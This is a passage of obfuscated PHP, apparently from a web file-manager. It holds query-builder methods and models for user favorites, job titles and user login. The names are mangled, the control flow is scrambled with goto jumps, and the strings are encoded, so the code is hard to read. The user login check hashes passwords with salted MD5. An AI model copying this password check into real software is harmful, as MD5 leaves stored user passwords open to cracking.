$D¿Ğ«ŞÈÛ½[$fè†õ•¿»„[234]]); return $D¿Ğ«ŞÈÛ½; } return !1; } public function data($bƒÇê›ÌµŞ = '') { $Eµñ¸‡šÖÓ =& $_SERVER[ì‹É]; if ($Eµñ¸‡šÖÓ[33] === $bƒÇê›ÌµŞ && !empty($this->data)) { return $this->data; } if (is_object($bƒÇê›ÌµŞ)) { $bƒÇê›ÌµŞ = get_object_vars($bƒÇê›ÌµŞ); } elseif (is_string($bƒÇê›ÌµŞ)) { parse_str($bƒÇê›ÌµŞ, $bƒÇê›ÌµŞ); } elseif (!is_array($bƒÇê›ÌµŞ)) { think_exception(think_lang($Eµñ¸‡šÖÓ[256])); } $this->data = $bƒÇê›ÌµŞ; return $this; } public function join($D—ã•“‹óø) { $aàòÍ’Ã’Û =& $_SERVER[ì‹É]; if (is_array($D—ã•“‹óø)) { $this->options[$aàòÍ’Ã’Û[267]] = $D—ã•“‹óø; } elseif (!empty($D—ã•“‹óø)) { $this->options[$aàòÍ’Ã’Û[267]][] = $D—ã•“‹óø; } return $this; } public function union($a¡‚¹¯¿îï, $f•âí ¶Ù = false) { goto AŞ•§ÃïÙ; cæÔ®óØóŒ: return $this; goto B˜ôêÃ²÷â; AŞ•§ÃïÙ: $f”™Èİº¾ =& $_SERVER[ì‹É]; if (empty($a¡‚¹¯¿îï)) { return $this; } if ($f•âí ¶Ù) { $this->options[$f”™Èİº¾[332]][$f”™Èİº¾[333]] = !0; } goto D±ÌÀ©¾¢­; D±ÌÀ©¾¢­: if (is_object($a¡‚¹¯¿îï)) { $a¡‚¹¯¿îï = get_object_vars($a¡‚¹¯¿îï); } if (is_string($a¡‚¹¯¿îï)) { $aœÙ±ìˆì‘ = $a¡‚¹¯¿îï; } elseif (is_array($a¡‚¹¯¿îï)) { if (isset($a¡‚¹¯¿îï[0])) { $this->options[$f”™Èİº¾[332]] = array_merge($this->options[$f”™Èİº¾[332]], $a¡‚¹¯¿îï); return $this; } else { $aœÙ±ìˆì‘ = $a¡‚¹¯¿îï; } } else { think_exception(think_lang($f”™Èİº¾[256])); } $this->options[$f”™Èİº¾[332]][] = $aœÙ±ìˆì‘; goto cæÔ®óØóŒ; B˜ôêÃ²÷â: } public function cache($cÃ¯ÌğÏ‰ğ = true, $c–â®¦²­ = null, $cÒŠéŒ—Šö = '') { $CÌé·Ø”„ç =& $_SERVER[ì‹É]; if (!1 !== $cÃ¯ÌğÏ‰ğ) { $this->options[$CÌé·Ø”„ç[334]] = array($CÌé·Ø”„ç[90] => $cÃ¯ÌğÏ‰ğ, $CÌé·Ø”„ç[324] => $c–â®¦²­, $CÌé·Ø”„ç[29] => $cÒŠéŒ—Šö); } return $this; } public function field($fê²¥ºŠ¹, $Cç¢¦„²¯£ = false) { $Bî¹×è¬‚„ =& $_SERVER[ì‹É]; if (!0 === $fê²¥ºŠ¹) { $eò©œö¬ˆø = $this->getDbFields(); $fê²¥ºŠ¹ = $eò©œö¬ˆø ? $eò©œö¬ˆø : $Bî¹×è¬‚„[173]; } elseif ($Cç¢¦„²¯£) { if (is_string($fê²¥ºŠ¹)) { $fê²¥ºŠ¹ = explode($Bî¹×è¬‚„[47], $fê²¥ºŠ¹); } $eò©œö¬ˆø = $this->getDbFields(); $fê²¥ºŠ¹ = $eò©œö¬ˆø ? array_diff($eò©œö¬ˆø, $fê²¥ºŠ¹) : $fê²¥ºŠ¹; } $this->options[$Bî¹×è¬‚„[258]] = $fê²¥ºŠ¹; return $this; } public function scope($dÓÕå„Û¾† = '', $eÇ×±Œ£¥· = NULL) { $e±‰»ÕÃÁô =& $_SERVER[ì‹É]; if ($e±‰»ÕÃÁô[33] === $dÓÕå„Û¾†) { if (isset($this->_scope[$e±‰»ÕÃÁô[34]])) { $eÖéé÷·½ = $this->_scope[$e±‰»ÕÃÁô[34]]; } else { return $this; } } elseif (is_string($dÓÕå„Û¾†)) { $Bò¦‰ø³Ä = explode($e±‰»ÕÃÁô[47], $dÓÕå„Û¾†); $eÖéé÷·½ = array(); foreach ($Bò¦‰ø³Ä as $d¹ë²§‚Ñ×) { if (!isset($this->_scope[$d¹ë²§‚Ñ×])) { continue; } $eÖéé÷·½ = array_merge($eÖéé÷·½, $this->_scope[$d¹ë²§‚Ñ×]); } if (!empty($eÇ×±Œ£¥·) && is_array($eÇ×±Œ£¥·)) { $eÖéé÷·½ = array_merge($eÖéé÷·½, $eÇ×±Œ£¥·); } } elseif (is_array($dÓÕå„Û¾†)) { $eÖéé÷·½ = $dÓÕå„Û¾†; } if (is_array($eÖéé÷·½) && !empty($eÖéé÷·½)) { $this->options = array_merge($this->options, array_change_key_case($eÖéé÷·½)); } return $this; } public function where($aõªƒƒğá–, $EÍõ‰Ê«ŠÆ = null) { $bŠ°ÌÚÖ‰ =& $_SERVER[ì‹É]; if (!is_null($EÍõ‰Ê«ŠÆ) && is_string($aõªƒƒğá–)) { if (!is_array($EÍõ‰Ê«ŠÆ)) { $EÍõ‰Ê«ŠÆ = func_get_args(); array_shift($EÍõ‰Ê«ŠÆ); } $EÍõ‰Ê«ŠÆ = array_map(array($this->db, $bŠ°ÌÚÖ‰[328]), $EÍõ‰Ê«ŠÆ); $aõªƒƒğá– = vsprintf($aõªƒƒğá–, $EÍõ‰Ê«ŠÆ); } elseif (is_object($aõªƒƒğá–)) { $aõªƒƒğá– = get_object_vars($aõªƒƒğá–); } if (is_string($aõªƒƒğá–) && $bŠ°ÌÚÖ‰[33] != $aõªƒƒğá–) { $AÚä¯Ëà = array(); $AÚä¯Ëà[$bŠ°ÌÚÖ‰[335]] = $aõªƒƒğá–; $aõªƒƒğá– = $AÚä¯Ëà; } if (isset($this->options[$bŠ°ÌÚÖ‰[260]])) { $this->options[$bŠ°ÌÚÖ‰[260]] = array_merge($this->options[$bŠ°ÌÚÖ‰[260]], $aõªƒƒğá–); } else { $this->options[$bŠ°ÌÚÖ‰[260]] = $aõªƒƒğá–; } return $this; } public function limit($Fõ„§ô¿Ê, $C¹¹¢’çª‰ = null) { $CÔÆ¿ŠÃŞƒ =& $_SERVER[ì‹É]; $this->options[$CÔÆ¿ŠÃŞƒ[277]] = is_null($C¹¹¢’çª‰) ? $Fõ„§ô¿Ê : $Fõ„§ô¿Ê . $CÔÆ¿ŠÃŞƒ[47] . $C¹¹¢’çª‰; return $this; } public function page($dŠîÔ·´Œì, $e‘ÊÃ»šÊ¬ = null) { $cŒ„Ê¶Š„¶ =& $_SERVER[ì‹É]; $this->options[$cŒ„Ê¶Š„¶[336]] = is_null($e‘ÊÃ»šÊ¬) ? $dŠîÔ·´Œì : $dŠîÔ·´Œì . $cŒ„Ê¶Š„¶[47] . $e‘ÊÃ»šÊ¬; return $this; } public function comment($a‚ˆ¿óÇ ) { $this->options[$_SERVER[ì‹É][337]] = $a‚ˆ¿óÇ ; return $this; } public function setProperty($f†Úğ«š , $e‰“ºÚ“·) { if (property_exists($this, $f†Úğ«š )) { $this->{$f†Úğ«š } = $e‰“ºÚ“·; } return $this; } } goto EÙÙîâÑî; eŠÅ‹º¢‡¹: class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\162\x5f\x66\x61\166"; protected function cacheFunctionAlias($bÙºŠêŸˆŒ) { $dŞîÖ¾ò­ =& $_SERVER[ì‹É]; return array($dŞîÖ¾ò­[2370] => array(USER_ID, $dŞîÖ¾ò­[2371])); } protected function listData() { $BİôÅÔ ª =& $_SERVER[ì‹É]; $dÆÄ½™ëÉ¨ = array($BİôÅÔ ª[1342] => USER_ID, $BİôÅÔ ª[432] => 0); $b½‡§‰Ë‰„ = $BİôÅÔ ª[2372]; $A§“ÙòÔÉË = $this->field($b½‡§‰Ë‰„)->where($dÆÄ½™ëÉ¨)->order($BİôÅÔ ª[2373])->select(); return $A§“ÙòÔÉË ? $A§“ÙòÔÉË : array(); } protected function resetCache() { } protected function listView() { goto a‹Ê¦ƒ©Ë¬; B¡ÌƒèÂ“ê: $cîÅ—ÌÇè = array_to_keyvalue($cîÅ—ÌÇè, $eéã¤ÀÖõ[366]); foreach ($FÕëå‚¸Ã¿ as $c•ÒÊñ ¡£ => $f“£©¯™) { $d«ßÊ¸ÎÜŒ = $cîÅ—ÌÇè[$f“£©¯™[$eéã¤ÀÖõ[76]]]; $d«ßÊ¸ÎÜŒ = $d«ßÊ¸ÎÜŒ ? $d«ßÊ¸ÎÜŒ : array(); $FÕëå‚¸Ã¿[$c•ÒÊñ ¡£] = array_merge($d«ßÊ¸ÎÜŒ, $f“£©¯™); } return $FÕëå‚¸Ã¿; goto fçÀ‚¼¢ªë; FÅÊéÀâÌ¶: $aœÊÆ¹¦Ç¯ = array($eéã¤ÀÖõ[380] => array($eéã¤ÀÖõ[381], $cø¼ÉŒÚ§¬)); $cîÅ—ÌÇè = Model($eéã¤ÀÖõ[757])->listSource($aœÊÆ¹¦Ç¯, $C–ƒäò«”¤); $cîÅ—ÌÇè = array_merge($cîÅ—ÌÇè[$eéã¤ÀÖõ[74]], $cîÅ—ÌÇè[$eéã¤ÀÖõ[75]]); goto B¡ÌƒèÂ“ê; a‹Ê¦ƒ©Ë¬: $eéã¤ÀÖõ =& $_SERVER[ì‹É]; $FÕëå‚¸Ã¿ = $this->listData(); $eŞ§ˆæ»ÒÎ = array_filter_by_field($FÕëå‚¸Ã¿, $eéã¤ÀÖõ[29], $eéã¤ÀÖõ[379]); goto d¨ÊŞ‘ò†ˆ; d¨ÊŞ‘ò†ˆ: $cø¼ÉŒÚ§¬ = array_to_keyvalue($eŞ§ˆæ»ÒÎ, $eéã¤ÀÖõ[33], $eéã¤ÀÖõ[76]); if (!$cø¼ÉŒÚ§¬) { return $FÕëå‚¸Ã¿; } $C–ƒäò«”¤ = 2000; goto FÅÊéÀâÌ¶; fçÀ‚¼¢ªë: } protected function addFav($d¾—å‰Ó‚¨, $c‰ëÂØâç® = '', $C®÷•‡‹ = "\x73\x6f\165\x72\143\x65") { goto d¹ÑÓ™…; d¹ÑÓ™…: $Föß¾²ïôÍ =& $_SERVER[ì‹É]; $Ağéóß¸å¦ = array($Föß¾²ïôÍ[1342] => USER_ID, $Föß¾²ïôÍ[432] => 0, $Föß¾²ïôÍ[385] => $C®÷•‡‹, $Föß¾²ïôÍ[384] => $d¾—å‰Ó‚¨); if ($this->where($Ağéóß¸å¦)->find()) { return !1; } goto DŠí§ïğİ; dÅªñŒ·: return $this->add($EÑ‚¶ù˜ªÌ); goto f­ÌÚ»Äğ; DŠí§ïğİ: $Ağéóß¸å¦ = array($Föß¾²ïôÍ[1342] => USER_ID, $Föß¾²ïôÍ[432] => 0); $F…‹ìáÄÖ® = $this->where($Ağéóß¸å¦)->max($Föß¾²ïôÍ[2035]); if (!$F…‹ìáÄÖ®) { $F…‹ìáÄÖ® = 0; } goto b“„Æ­”ˆ; b“„Æ­”ˆ: if (!$c‰ëÂØâç® && $C®÷•‡‹ == $Föß¾²ïôÍ[379]) { $e‚˜øªÅ“ã = Model($Föß¾²ïôÍ[1083])->where(array($Föß¾²ïôÍ[380] => $d¾—å‰Ó‚¨))->find(); if (!$e‚˜øªÅ“ã) { return !1; } $c‰ëÂØâç® = $e‚˜øªÅ“ã[$Föß¾²ïôÍ[28]]; } $c‰ëÂØâç® = $this->getAutoName($c‰ëÂØâç®); $EÑ‚¶ù˜ªÌ = array($Föß¾²ïôÍ[1342] => USER_ID, $Föß¾²ïôÍ[432] => 0, $Föß¾²ïôÍ[383] => $c‰ëÂØâç®, $Föß¾²ïôÍ[384] => $d¾—å‰Ó‚¨, $Föß¾²ïôÍ[385] => $C®÷•‡‹, $Föß¾²ïôÍ[2018] => $F…‹ìáÄÖ® + 1); goto dÅªñŒ·; f­ÌÚ»Äğ: } protected function remove($Dàç†´ÓÃË) { $Câòœƒ³« =& $_SERVER[ì‹É]; $bõÛ¤¸·œÙ = array($Câòœƒ³«[1342] => USER_ID, $Câòœƒ³«[382] => $Dàç†´ÓÃË); return $this->where($bõÛ¤¸·œÙ)->delete(); } protected function removeByName($F†»­Š¾î•) { $Cˆ¢Æª¨ùé =& $_SERVER[ì‹É]; $bªÆ…“Íš½ = array($Cˆ¢Æª¨ùé[1342] => USER_ID, $Cˆ¢Æª¨ùé[383] => $F†»­Š¾î•, $Cˆ¢Æª¨ùé[432] => 0); return $this->where($bªÆ…“Íš½)->delete(); } protected function rename($aä£Ÿ‰ì”, $C®Ï«–İ´) { $d¾¹¨ƒùêµ =& $_SERVER[ì‹É]; if ($aä£Ÿ‰ì” == $C®Ï«–İ´) { return !1; } $CĞ‡è¢ééÛ = $this->getAutoName($C®Ï«–İ´); if ($C®Ï«–İ´ != $CĞ‡è¢ééÛ) { return !1; } $d÷ø„×›‚… = array($d¾¹¨ƒùêµ[1342] => USER_ID, $d¾¹¨ƒùêµ[432] => 0, $d¾¹¨ƒùêµ[28] => $aä£Ÿ‰ì”); return $this->where($d÷ø„×›‚…)->save(array($d¾¹¨ƒùêµ[28] => $C®Ï«–İ´)); } protected function resetSort($F–Æ‹Œ™ïğ) { $CÍ¡ã¿¼ç¿ =& $_SERVER[ì‹É]; $E¦¡‰Æğ¯Ş = array($CÍ¡ã¿¼ç¿[1342] => USER_ID); for ($b…ÙÑ—§Ø¿ = 0; $b…ÙÑ—§Ø¿ < count($F–Æ‹Œ™ïğ); $b…ÙÑ—§Ø¿++) { $E¦¡‰Æğ¯Ş[$CÍ¡ã¿¼ç¿[382]] = $F–Æ‹Œ™ïğ[$b…ÙÑ—§Ø¿]; $this->where($E¦¡‰Æğ¯Ş)->save(array($CÍ¡ã¿¼ç¿[2018] => $b…ÙÑ—§Ø¿ + 1)); } return !0; } protected function moveTop($cº‘ëšçƒ¼) { goto D§ˆ¬Ú»ù; C£Üà¶µÚÂ: return $this->resetSort($C”¯Âïç); goto dÁÛ„¼ ö·; D§ˆ¬Ú»ù: $AğñË¬Éá– =& $_SERVER[ì‹É]; $F¾ÓâÍÃŠ = array($AğñË¬Éá–[1342] => USER_ID, $AğñË¬Éá–[432] => 0); $d¦™ÀóÍƒ = $this->where($F¾ÓâÍÃŠ)->where(array($AğñË¬Éá–[28] => $cº‘ëšçƒ¼))->find(); goto E£Ô‰±áÒÜ; dÉßß«šÛ: $FÀªÛç“á = $C”¯Âïç; $C”¯Âïç = array_remove_value($C”¯Âïç, $d¦™ÀóÍƒ[$AğñË¬Éá–[364]]); array_unshift($C”¯Âïç, $d¦™ÀóÍƒ[$AğñË¬Éá–[364]]); goto C£Üà¶µÚÂ; E£Ô‰±áÒÜ: if (!$d¦™ÀóÍƒ) { return; } $C”¯Âïç = $this->field($AğñË¬Éá–[364])->where($F¾ÓâÍÃŠ)->order($AğñË¬Éá–[2373])->select(); $C”¯Âïç = array_to_keyvalue($C”¯Âïç, $AğñË¬Éá–[33], $AğñË¬Éá–[364]); goto dÉßß«šÛ; dÁÛ„¼ ö·: } protected function moveBottom($Fâ¤…×Œß) { $AŠ†ŞÒÀ«î =& $_SERVER[ì‹É]; $Eê°Œ´¹ì = array($AŠ†ŞÒÀ«î[1342] => USER_ID, $AŠ†ŞÒÀ«î[432] => 0); $a‰àñïŸ•Í = $this->where($Eê°Œ´¹ì)->max($AŠ†ŞÒÀ«î[2035]); $C¬£‘¶ºƒÅ = array($AŠ†ŞÒÀ«î[2035] => $a‰àñïŸ•Í + 1); return $this->where($Eê°Œ´¹ì)->where(array($AŠ†ŞÒÀ«î[28] => $Fâ¤…×Œß))->save($C¬£‘¶ºƒÅ); } private function getAutoName($AÌî³ø¥ŞÇ) { goto bçİ–ã‡í ; E’‚‚³Ñ: $Bõ‘ƒ¸´Ùì = array_to_keyvalue($Bõ‘ƒ¸´Ùì, $a†Ó˜‹¸È‚[33], $a†Ó˜‹¸È‚[28]); if (!$Bõ‘ƒ¸´Ùì || !in_array($AÌî³ø¥ŞÇ, $Bõ‘ƒ¸´Ùì)) { return $AÌî³ø¥ŞÇ; } for ($aĞÛ‚èÏ©œ = 0; $aĞÛ‚èÏ©œ < count($Bõ‘ƒ¸´Ùì); $aĞÛ‚èÏ©œ++) { if (!in_array($AÌî³ø¥ŞÇ . "\x28{$aĞÛ‚èÏ©œ}\x29", $Bõ‘ƒ¸´Ùì)) { return $AÌî³ø¥ŞÇ . "\50{$aĞÛ‚èÏ©œ}\51"; } } goto AÓÈÜĞ‚„ö; bçİ–ã‡í : $a†Ó˜‹¸È‚ =& $_SERVER[ì‹É]; $aÔÛ›¼öš = array($a†Ó˜‹¸È‚[1342] => USER_ID, $a†Ó˜‹¸È‚[432] => 0); $Bõ‘ƒ¸´Ùì = $this->field($a†Ó˜‹¸È‚[28])->where($aÔÛ›¼öš)->select(); goto E’‚‚³Ñ; AÓÈÜĞ‚„ö: return $AÌî³ø¥ŞÇ . "\50{$aĞÛ‚èÏ©œ}\x29"; goto e“™ÈïÚµà; e“™ÈïÚµà: } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\163\164\x65\155\x2e\x6a\x6f\142\x4c\x69\x73\x74"; public $field = array("\x6e\x61\155\x65", "\x64\x65\x73\x63", "\163\157\162\164"); const JOB_KEY = "\x73\145\x6c\146\x4a\157\x62\x4c\151\x73\164"; public function listData($cÌŞ¡áŠà“ = false, $f¼£šÌĞ = "\163\157\162\164", $F¾¤£Ïøàø = false) { return parent::listData($cÌŞ¡áŠà“, $f¼£šÌĞ, $F¾¤£Ïøàø); } public function remove($aÂÃÆ†ÈÏ…) { return parent::remove($aÂÃÆ†ÈÏ…); } public function add($BŒªéª¾ÅŒ) { $B–®Š½ù˜ =& $_SERVER[ì‹É]; if ($this->findByName($BŒªéª¾ÅŒ[$B–®Š½ù˜[28]])) { return !1; } $BŒªéª¾ÅŒ[$B–®Š½ù˜[2035]] = $this->getSort(); return parent::insert($BŒªéª¾ÅŒ); } private function getSort() { $D‘çÌ«™± =& $_SERVER[ì‹É]; $b¶¡ÅÇ¨Ã‡ = parent::listData(); $dİĞ‹­ìÔš = array_to_keyvalue($b¶¡ÅÇ¨Ã‡, $D‘çÌ«™±[33], $D‘çÌ«™±[2035]); return empty($dİĞ‹­ìÔš) ? 0 : max($dİĞ‹­ìÔš) + 1; } public function update($Aâõñ–½ÌÄ, $Eå‹Ù†„§‹) { $Få«™Ó›±º =& $_SERVER[ì‹É]; $A„İ¥®×† = parent::listData($Aâõñ–½ÌÄ); $b’ÓõÜ–â÷ = $this->findByName($Eå‹Ù†„§‹[$Få«™Ó›±º[28]]); if (!$A„İ¥®×† || $b’ÓõÜ–â÷ && $b’ÓõÜ–â÷[$Få«™Ó›±º[364]] != $A„İ¥®×†[$Få«™Ó›±º[364]]) { return !1; } return parent::update($Aâõñ–½ÌÄ, $Eå‹Ù†„§‹); } public function setUserJob($e½îÛ³ö™…, $d§‚•‰¡Œ) { goto Fˆ¹Ë£–Ø®; Fˆ¹Ë£–Ø®: $cŠà‚Ÿ† =& $_SERVER[ì‹É]; if (!is_array($d§‚•‰¡Œ)) { $d§‚•‰¡Œ = array($d§‚•‰¡Œ); } $dÔ¡İÅ³¸ƒ = parent::listData(); goto Eœ Ü±àÊë; EÂÌ©çÔİö: $d¶Ğ¹—‰ˆ = rtrim($d¶Ğ¹—‰ˆ, $cŠà‚Ÿ†[47]); Model($cŠà‚Ÿ†[469])->metaSet($e½îÛ³ö™…, self::JOB_KEY, $d¶Ğ¹—‰ˆ); goto fƒ‡Æ¼¦ ; Eœ Ü±àÊë: $BÅƒàÒŒä = array_to_keyvalue($dÔ¡İÅ³¸ƒ, $cŠà‚Ÿ†[28]); $d¶Ğ¹—‰ˆ = $cŠà‚Ÿ†[358]; foreach ($d§‚•‰¡Œ as $dª±¢Ë±ÎÖ) { if ($BÅƒàÒŒä[$dª±¢Ë±ÎÖ]) { $d¶Ğ¹—‰ˆ .= $BÅƒàÒŒä[$dª±¢Ë±ÎÖ][$cŠà‚Ÿ†[364]] . $cŠà‚Ÿ†[47]; } else { $DÎ‡åÙä’æ = $this->add($dª±¢Ë±ÎÖ); $d¶Ğ¹—‰ˆ .= $DÎ‡åÙä’æ . $cŠà‚Ÿ†[47]; } } goto EÂÌ©çÔİö; fƒ‡Æ¼¦ : } public function getUserJob($cìµœ¦×À) { $bšã§îøß = Model($_SERVER[ì‹É][469])->metaGet($cìµœ¦×À); return $this->getUserJobInfo($bšã§îøß[self::JOB_KEY]); } public function getUserJobInfo($A³‹©İİ») { goto CÔˆÌŒÃ­; eùµ‚Ø°: return $B–ğÅ£’¬; goto cÕ…Û°µ·«; b‘¬ÑË¯¬: $a¸œˆö†éï = array_remove_key($a¸œˆö†éï, $B¹œÈ„ÜíÀ[184]); $B–ğÅ£’¬ = array(); foreach ($béõ•¹ˆ‹Ì as $fùº®À) { if (isset($a¸œˆö†éï[$fùº®À])) { $B–ğÅ£’¬[] = $a¸œˆö†éï[$fùº®À]; } } goto eùµ‚Ø°; CÔˆÌŒÃ­: $B¹œÈ„ÜíÀ =& $_SERVER[ì‹É]; $béõ•¹ˆ‹Ì = explode($B¹œÈ„ÜíÀ[47], $A³‹©İİ»); $a¸œˆö†éï = parent::listData(); goto b‘¬ÑË¯¬; cÕ…Û°µ·«: } } class UserModel extends ModelBase { protected $tableName = "\165\163\145\x72"; protected $tableMeta = array("\x74\x61\142\x6c\145\116\141\x6d\x65" => "\165\x73\145\x72\137\155\145\164\141", "\155\145\164\141\x46\x69\x65\154\144" => "\x75\163\145\x72\111\104"); protected $simpleField = "\165\x73\145\x72\x49\104\54\156\151\x63\x6b\116\141\x6d\145\54\156\141\155\x65\54\x61\x76\x61\x74\x61\162\54\163\145\170"; const ERROR_USER_NOT_EXISTS = -1; const ERROR_USER_PASSWORD_ERROR = -2; const ERROR_USER_EXIST_NAME = -3; const ERROR_USER_EXIST_PHONE = -4; const ERROR_USER_EXIST_EMAIL = -5; const ERROR_USER_LOGIN_LOCK = -6; const ERROR_IP_NOT_ALLOW = -7; const ERROR_USER_EXIST_NICKNAME = -8; protected function cacheFunctionAlias($b´ÆÅÆÓ£„) { $E‹ó·îŒÁ­ =& $_SERVER[ì‹É]; return array($E‹ó·îŒÁ­[2081] => array($b´ÆÅÆÓ£„[0], $E‹ó·îŒÁ­[2374]), $E‹ó·îŒÁ­[2083] => array($b´ÆÅÆÓ£„[0], $E‹ó·îŒÁ­[2374])); } protected function getInfo($e´Ï‹‹ŸÛ, $bëö®Ÿ’‘Œ = false) { $a»áÚï =& $_SERVER[ì‹É]; $eéºµî¨¶â = $this->getInfoSimple($e´Ï‹‹ŸÛ); if (!is_array($eéºµî¨¶â)) { return array(); } if ($bëö®Ÿ’‘Œ) { goto bÏ‰¿Ü³Í…; c®¤Ø›ô¾ø: return $eéºµî¨¶â; goto aàâÑé—¿Î; bÏ‰¿Ü³Í…: if (!$eéºµî¨¶â) { return $eéºµî¨¶â; } $CÏëÇã³äë = md5($a»áÚï[2375] . $eéºµî¨¶â[$a»áÚï[798]] . $a»áÚï[2376] . $eéºµî¨¶â[$a»áÚï[28]]); $eéºµî¨¶â = $this->_listDataApplyItem($eéºµî¨¶â); goto F…Çö¸ˆŒ•; F…Çö¸ˆŒ•: $FÍ¶¿ª×¶Ó = Model($a»áÚï[1083])->metaGet($eéºµî¨¶â[$a»áÚï[388]][$a»áÚï[366]]); $eéºµî¨¶â[$a»áÚï[2377]] = $CÏëÇã³äë; $eéºµî¨¶â[$a»áÚï[388]][$a»áÚï[2229]] = isset($FÍ¶¿ª×¶Ó[$a»áÚï[2230]]) ? $FÍ¶¿ª×¶Ó[$a»áÚï[2230]] : null; goto c®¤Ø›ô¾ø; aàâÑé—¿Î: } return $this->cacheFunctionGet($a»áÚï[2124], $e´Ï‹‹ŸÛ); } protected function getInfoSimple($aÓ˜×Ø¥ç·, $BĞÅ»ï¯—¯ = false) { $eŒ‘»†—Á¾ =& $_SERVER[ì‹É]; if (!$aÓ˜×Ø¥ç·) { return array(); } if ($BĞÅ»ï¯—¯) { $AÑ³©ëÍÛÌ = $this->where(array($eŒ‘»†—Á¾[1351] => intval($aÓ˜×Ø¥ç·)))->find(); if (!is_array($AÑ³©ëÍÛÌ)) { return array(); } $AÑ³©ëÍÛÌ[$eŒ‘»†—Á¾[2378]] = Action($eŒ‘»†—Á¾[2379])->parseUrl($AÑ³©ëÍÛÌ[$eŒ‘»†—Á¾[2378]]); return $AÑ³©ëÍÛÌ; } return $this->cacheFunctionGet($eŒ‘»†—Á¾[2084], $aÓ˜×Ø¥ç·); } protected function getInfoSimpleOuter($Cª£“Øóœ) { goto f±¶Œë¬«´; f»¦ºßğÃà: $aŸß³ğŸŒ¬ = array_field_key($e­ÌÛÚ¶ğ, explode($d¸—Š×™¬ß[47], $this->simpleField)); if (!$aŸß³ğŸŒ¬) { return array($d¸—Š×™¬ß[1351] => $d¸—Š×™¬ß[1005], $d¸—Š×™¬ß[28] => $d¸—Š×™¬ß[154] . LNG($d¸—Š×™¬ß[2382]) . $d¸—Š×™¬ß[468], $d¸—Š×™¬ß[2378] => STATIC_PATH . $d¸—Š×™¬ß[2383]); } $aŸß³ğŸŒ¬[$d¸—Š×™¬ß[2378]] = Action($d¸—Š×™¬ß[2379])->parseUrl($aŸß³ğŸŒ¬[$d¸—Š×™¬ß[2378]]); goto a‘¬Ü‡–ç; f±¶Œë¬«´: $d¸—Š×™¬ß =& $_SERVER[ì‹É]; if (!$Cª£“Øóœ || $Cª£“Øóœ == 0) { return array($d¸—Š×™¬ß[1351] => $d¸—Š×™¬ß[464], $d¸—Š×™¬ß[28] => $d¸—Š×™¬ß[154] . LNG($d¸—Š×™¬ß[2380]) . $d¸—Š×™¬ß[468], $d¸—Š×™¬ß[2378] => STATIC_PATH . $d¸—Š×™¬ß[2381]); } $e­ÌÛÚ¶ğ = $this->cacheFunctionGet($d¸—Š×™¬ß[2084], $Cª£“Øóœ); goto f»¦ºßğÃà; a‘¬Ü‡–ç: return $aŸß³ğŸŒ¬; goto CŒÅÌä‡; CŒÅÌä‡: } protected function groupUser($CÁ·Æ³…ª) { } public static function errorLang($BôŸİÃ‹¶ğ) { $c––´ª„µ =& $_SERVER[ì‹É]; $cÒ›‡¾µ† = array(self::ERROR_USER_NOT_EXISTS => $c––´ª„µ[2384], self::ERROR_USER_PASSWORD_ERROR => $c––´ª„µ[2385], self::ERROR_USER_EXIST_NAME => $c––´ª„µ[2386], self::ERROR_USER_EXIST_PHONE => $c––´ª„µ[2387], self::ERROR_USER_EXIST_EMAIL => $c––´ª„µ[2388], self::ERROR_USER_LOGIN_LOCK => $c––´ª„µ[2389], self::ERROR_IP_NOT_ALLOW => $c––´ª„µ[2390], self::ERROR_USER_EXIST_NICKNAME => $c––´ª„µ[2391]); return LNG($cÒ›‡¾µ†[$BôŸİÃ‹¶ğ]); } public function getInfoByMeta($EÅÊÈ¢×±­, $E°­­®ÉøÇ) { $fˆ ÔÊµÚ¾ =& $_SERVER[ì‹É]; $Dõ¤¯œóÔ„ = Model($fˆ ÔÊµÚ¾[2392])->where(array($fˆ ÔÊµÚ¾[90] => $EÅÊÈ¢×±­, $fˆ ÔÊµÚ¾[354] => $E°­­®ÉøÇ))->find(); if ($Dõ¤¯œóÔ„) { return $this->getInfo($Dõ¤¯œóÔ„[$fˆ ÔÊµÚ¾[1351]]); } return !1; } public function userLoginCheck($a¡ŠåÁËç, $aà„ÒŸ§¢ó) { goto e§İ†ºíˆ³; aãµˆˆÒ¦”: $this->userEdit($d£ŸµñÀòÏ[$CâÓÃ®Ò[1351]], array($CâÓÃ®Ò[2394] => time())); $this->clearCache($d£ŸµñÀòÏ[$CâÓÃ®Ò[1351]]); return $this->getInfo($d£ŸµñÀòÏ[$CâÓÃ®Ò[1351]]); goto b©‡‚›Â‹; e§İ†ºíˆ³: $CâÓÃ®Ò =& $_SERVER[ì‹É]; $b¬ğÕ“ª = array($CâÓÃ®Ò[28] => $a¡ŠåÁËç, $CâÓÃ®Ò[2232] => $a¡ŠåÁËç, $CâÓÃ®Ò[290] => $a¡ŠåÁËç, $CâÓÃ®Ò[2393] => $a¡ŠåÁËç, $CâÓÃ®Ò[911] => $CâÓÃ®Ò[913]); if ($this->nickNameRpt()) { unset($b¬ğÕ“ª[$CâÓÃ®Ò[2232]]); } goto fä“Æ‘­±; fä“Æ‘­±: $d£ŸµñÀòÏ = $this->where($b¬ğÕ“ª)->find(); if (!$d£ŸµñÀòÏ) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($d£ŸµñÀòÏ[$CâÓÃ®Ò[1351]], $aà„ÒŸ§¢ó)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } goto aãµˆˆÒ¦”; b©‡‚›Â‹: } public function clearCache($DÊé†Â¦ÆÎ) { $F¸÷™šŞôØ =& $_SERVER[ì‹É]; $this->cacheFunctionClear($F¸÷™šŞôØ[2124], $DÊé†Â¦ÆÎ); $this->cacheFunctionClear($F¸÷™šŞôØ[2084], $DÊé†Â¦ÆÎ); } public function userPasswordCheck($bÙâ­ñè‹±, $fÌÖ›¹Ø›½) { $B¸Ü• µ­¶ =& $_SERVER[ì‹É]; $fÆõ«¨££Œ = $this->where(array($B¸Ü• µ­¶[1351] => intval($bÙâ­ñè‹±)))->find(); $b«ÚÛ„á—ù = $this->metaGet($bÙâ­ñè‹±); $aÒ¤É¬ÄÆ§ = isset($b«ÚÛ„á—ù[$B¸Ü• µ­¶[2395]]) ? $b«ÚÛ„á—ù[$B¸Ü• µ­¶[2395]] : $B¸Ü• µ­¶[33]; if (md5($aÒ¤É¬ÄÆ§ . trim($fÌÖ›¹Ø›½)) !== $fÆõ«¨££Œ[$B¸Ü• µ­¶[798]]) { return !1; } return !0; } public function userAdd($d¾ÚÆ‡¡) { goto f“”½é…ÃÌ; f“”½é…ÃÌ: $b®§”ª„– =& 